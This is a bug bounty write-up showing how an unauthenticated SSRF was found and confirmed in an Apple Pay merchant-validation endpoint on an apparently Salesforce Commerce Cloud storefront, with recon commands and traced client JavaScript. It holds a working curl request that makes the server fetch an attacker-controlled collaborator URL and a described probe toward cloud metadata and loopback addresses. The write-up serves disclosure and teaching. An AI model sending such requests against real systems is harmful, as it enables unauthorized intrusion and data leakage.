# Walkthrough: Finding, Proving, and Ruling In an SSRF

> All target hostnames, site IDs, merchant identifiers, and collaborator domains in
> this document are placeholders. Commands are shown exactly as run against the real
> target, with only the identifying strings swapped out, so the methodology is
> reproducible against any target *you are authorized to test*.

## 0. Scope discipline, first

Before touching anything, the in-scope asset was verified against the program's
published scope (aggregated from the platform's public scope API — the same
approach [`bounty-targets-data`](https://github.com/arkadiyt/bounty-targets-data)
uses). Only a single, non-wildcard host was in scope:

```
https://shop.example.com     (web-application)
```

No wildcard — so any subdomains discovered later (`help.`, `support.`, `returns-*.`,
etc.) were explicitly excluded from testing, even when they showed up in the same
recon output. The program also mandated a custom `User-Agent` suffix on every request
(`BugBounty-ExampleCorp`) and prohibited anything resembling denial-of-service. Both
constraints shaped every command below — single, hand-crafted requests, never a
flood.

## 1. Recon: mapping what's actually live

```bash
gau --subs shop.example.com | sort -u > gau_urls.txt          # historical URLs
katana -u https://shop.example.com -d 3 -jc -kf all \
  -H "User-Agent: Mozilla/5.0 BugBounty-ExampleCorp" \
  -c 5 -rl 10 -silent -o katana_urls.txt                       # live crawl, rate-limited
```

Two things stood out immediately:

- A chunk of `gau`'s historical URLs pointed at a **legacy endpoint**
  (`/Utilities/getDoc.aspx?file=...`) that looked exactly like the kind of
  "fetch a file/URL server-side" sink worth chasing — but a baseline request
  returned the *current* site's soft-404 template. Dead end: the platform had since
  migrated. Wayback data can lie about what's still live; always baseline-check
  before investing time in an archived lead.
- `robots.txt` disallowed SFCC/Demandware-specific query parameters
  (`dwcont=`, `prefn1=`, `srule=`, `cgid=`) — fingerprinting the stack as
  **Salesforce Commerce Cloud** before a single page was even rendered.

## 2. Triage: enumerating the real controller surface

Historical URLs from `gau` were mostly marketing/UTM noise. The live `katana` crawl
surfaced the actual custom-cartridge controller surface by extracting unique
`Controller-Action` names from every `/on/demandware.store/Sites-*-Site/...` URL:

```
Adyen-CreateTemporaryBasket        Adyen-GetPaymentMethods
Adyen-PaymentFromComponent         Adyen-PaymentsDetails
Adyen-SelectShippingMethod         Adyen-ShippingMethods
Adyen-ShowConfirmationPaymentFromComponent
Klaviyo-Subscribe   Login-Show   Page-Show   Search-ShowAjax   ...
```

The Adyen payment controllers were the obvious first suspects for SSRF (payment
integrations routinely take redirect/callback URLs). Pulling Adyen's **open-source**
SFCC cartridge from GitHub and reading `paymentsDetails.js` showed the redirect data
is always POSTed to a **fixed** Adyen API host — the destination isn't
attacker-controlled, so this is a dead end for classic SSRF (though it may be worth a
separate look for parameter-injection issues, a different bug class entirely).

Dead ends so far:
- Legacy `getDoc.aspx` — platform migrated, endpoint gone.
- `rurl=` login redirect param — returns HTTP 200 with no `Location` header; not a
  server-side redirect/fetch at all, just an inert client-side value.
- `loqatecustom.js` / `loqatehelper.js` (an address-autocomplete widget) — calls the
  third-party API **directly from the browser**; no server-side proxy involved.
- Adyen payment cartridge — fetches a fixed vendor API host, not attacker-controlled.

## 3. The lead: parameter discovery surfaces Apple Pay callback names

Running `arjun` against the login page didn't brute-force anything new, but its
response-scraping step extracted parameter names referenced in the page's own inline
JSON/JS config — and several jumped out immediately:

```
onvalidatemerchant, onpaymentauthorized, onshippingcontactselected,
onshippingmethodselected, onpaymentmethodselected, getRequest, prepareBasket
```

Those are the exact callback names from the
[Apple Pay JS API](https://developer.apple.com/documentation/apple_pay_on_the_web) —
`ApplePaySession.onvalidatemerchant` in particular is *the* well-documented SSRF
hotspot in Apple Pay integrations: the browser receives a `validationURL` from Apple,
and it's the **merchant's backend's job** to verify that URL belongs to Apple before
fetching it server-side to obtain a merchant session.

Confirmed Apple Pay was wired up: `internal/jscript/applepay.js` was present in the
site's JS bundle list.

## 4. Root-cause tracing: reading the actual client code

```bash
curl -A "Mozilla/5.0 BugBounty-ExampleCorp" \
  ".../js/applepay.js" -o applepay.js
grep -n "onvalidatemerchant\|filterEvent\|postJson" applepay.js
```

The relevant logic:

```js
function filterEvent (e) {
    var filteredEvent = {};
    for (var prop in e) {
        if (!Event.prototype.hasOwnProperty(prop)) {
            filteredEvent[prop] = e[prop];   // copies e.validationURL, among others
        }
    }
    return filteredEvent;
}

function onvalidatemerchantHandler (e) {
    postJson(action.onvalidatemerchant, Object.assign(filterEvent(e), {
        hostname: window.location.hostname
    })).then(function (response) {
        session.completeMerchantValidation(response.session);
    }, function (error) { session.abort(); });
}
```

`filterEvent(e)` copies **every** enumerable property off the browser's
`ApplePayValidateMerchantEvent` — including `validationURL` — and POSTs the whole
thing, verbatim, to a backend URL. That URL itself was easy to recover: it's embedded
as inline JSON on any cart/PDP page:

```json
"action": {
  "onvalidatemerchant": "https://shop.example.com/on/demandware.store/Sites-ExampleSite-Site/en_US/__SYSTEM__ApplePay-ValidateMerchant",
  ...
}
```

No CSRF token guards it, and `postJson` sends a bare `fetch()` with
`credentials: 'include'` — a session cookie is enough (and SFCC hands out an
anonymous session cookie to any visitor with zero authentication).

**Hypothesis:** if the backend doesn't verify `validationURL` resolves to an
Apple-owned domain before fetching it, this is a full, unauthenticated SSRF.

## 5. Experiment 1 — proving it with a real OOB HTTP interaction

The generic "IP bypass" SSRF payload tables don't apply here — the destination is a
full URL in a JSON body, not a query parameter behind a WAF. The only thing worth
testing is: **does the backend actually fetch whatever URL I put in `validationURL`?**

```bash
interactsh-client -json   # spins up a fresh, unique collaborator subdomain
# => abc123....oast.live

curl -A "Mozilla/5.0 BugBounty-ExampleCorp" -c cookies.txt -b cookies.txt \
  "https://shop.example.com/en-us/cart" -o /dev/null    # pick up an anonymous session cookie

curl -A "Mozilla/5.0 BugBounty-ExampleCorp" -c cookies.txt -b cookies.txt \
  -H "Content-Type: application/json" -X POST \
  --data '{"validationURL":"https://abc123....oast.live/ssrf-poc","hostname":"shop.example.com"}' \
  "https://shop.example.com/on/demandware.store/Sites-ExampleSite-Site/en_US/__SYSTEM__ApplePay-ValidateMerchant"
```

Response to the caller: `HTTP 500 {"error":"Unknown error","status":"Failure"}` —
looks like a dud at first glance. But the collaborator log tells the real story:

```json
{
  "protocol": "http",
  "raw-request": "POST /ssrf-poc HTTP/1.1\r\nHost: abc123....oast.live\r\n...\r\nUser-Agent: Apache-HttpClient/4.5.13 (Java/17.0.16.0.101)\r\n\r\n{\"merchantIdentifier\":\"merchant.example.demandware.example-na01-production\",\"displayName\":\"EXAMPLE STORE\",\"domainName\":\"shop.example.com\"}"
}
```

**A real, independent HTTP POST landed on infrastructure only I control**, carrying
the target's own internal Apple Pay merchant configuration (a live merchant
identifier). See [`docs/sequence-diagram.md`](./docs/sequence-diagram.md) for exactly
why the caller-visible 500 and the successful SSRF are *not* a contradiction — the 500
is what happens when the backend tries to parse my dummy HTML response as a real
Apple merchant-session JSON object and fails; the SSRF request had already gone out
and come back by the time that parse error fires.

## 6. Ruling out false positives

An OOB DNS hit alone is a classic false-positive trap (link-preview bots, WAFs, and
mail/security scanners all resolve domains they find in request bodies without the
*application* ever making a real HTTP call). Here's why this evidence survives that
scrutiny:

| Possible false-positive cause | Why it's ruled out here |
|---|---|
| DNS-prefetch / scanner artifact | We got a full **HTTP POST with a body**, not a bare DNS query — prefetchers don't do that. |
| My own tooling made a second request | My `curl` process only ever contacted `shop.example.com`; it has no code path that independently calls a URL sitting inside its own request body. |
| Generic bot/proxy traffic | The captured `User-Agent` (`Apache-HttpClient/4.5.13 (Java/17...)`) is a completely different client than my own (`curl`/custom UA) — proof a *second, independent* process made the call. That signature is also consistent with a JVM-based e-commerce platform's server-side HTTP client, not any generic crawler. |
| Coincidence / stale/replayed traffic | The payload contains the target's **own internal merchant identifier** — something only the application itself could produce — correlated to a freshly generated, single-use collaborator subdomain, arriving ~1 second after the trigger request. |

## 7. Experiment 2 — independent reproduction

A single hit could still be a fluke. Repeating the exact test with a **second,
brand-new** collaborator domain (generated fresh, never referenced anywhere before)
produced an identical result — same User-Agent, same payload shape, same live
merchant identifier, hitting the new domain within about a second of the trigger
request. Deterministic, on-demand reproduction, not a one-off anomaly.

## 8. Experiment 3 — attempting impact escalation (and reporting the limits honestly)

To gauge whether this SSRF could reach internal network resources or cloud metadata
(`169.254.169.254`), a timing side-channel was attempted: private/link-local/loopback
destinations should time out or fail fast if blocked, versus succeeding quickly if
reachable. In practice, **every** destination tested — a known-blackholed private IP,
the cloud-metadata address, loopback, and a known-good public host — returned within
the same ~0.3–0.6 second window with an identical generic error body. That's not a
usable signal; the application's exception handling appears to collapse every
non-Apple-shaped outcome into the same generic message, so response time and body
can't distinguish "reached and rejected" from "reached and mis-parsed" from "never
reached at all."

**This is reported as inconclusive, not as confirmed internal-network access.**
Overclaiming impact the evidence doesn't support helps no one — not the reader, and
not the researcher's credibility with the vendor's triage team.

## 9. Outcome

- **Confirmed:** unauthenticated SSRF via `ApplePay-ValidateMerchant`, proven with two
  independent OOB HTTP interactions, disclosing a live internal merchant identifier to
  attacker-controlled infrastructure.
- **Not confirmed (and reported as such):** internal-network or cloud-metadata
  reachability through this SSRF.
- **Reported** to the vendor through their bug bounty program, with the full
  reproduction steps above and this same honesty about what was and wasn't proven.

## Lessons for the next hunt

- **Client-side event-forwarding code is a goldmine.** The vulnerability wasn't
  visible from the outside at all — no reflected parameter, no error-based oracle.
  It only surfaced by reading `applepay.js` and tracing one specific callback
  (`onvalidatemerchant`) down to its backend sink.
- **A generic "does it fetch the URL" test beats a payload table** for
  JSON-body/webhook-style SSRF — there's no WAF-bypass encoding trick that matters
  when the attacker just controls the whole URL string outright.
- **A single OOB hit isn't proof by itself — the *shape* of the interaction is.** A
  bare DNS query proves much less than a full HTTP request carrying
  application-specific data that only the real backend could have produced.
- **Reproduce with a fresh identifier before calling it done.** It's cheap insurance
  against a one-off fluke or session artifact.
- **Report what you can't confirm as clearly as what you can.** An inconclusive
  escalation attempt is still useful information for the vendor's triage — inflating
  it erodes trust in every other claim in the report.
